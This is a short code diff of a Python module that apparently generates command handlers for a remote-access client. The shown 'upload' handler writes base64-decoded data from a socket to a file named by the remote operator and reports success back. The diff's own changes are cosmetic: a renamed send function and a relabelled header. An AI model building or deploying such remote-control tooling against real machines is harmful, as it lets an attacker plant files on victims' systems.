@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -16,7 +15,7 @@ def upload(data):
     filename = ' '.join(data[1:-1])
     f = open(filename,'wb')
     f.write(b64decode(data[-1]))
-    main_send('[+]Successfully wrote uploaded file data', s)''')
+    send_all(s,'[+]Successfully wrote uploaded file data')''')
         config.logics.append('''
             elif command == "upload":
                 upload(data)''')
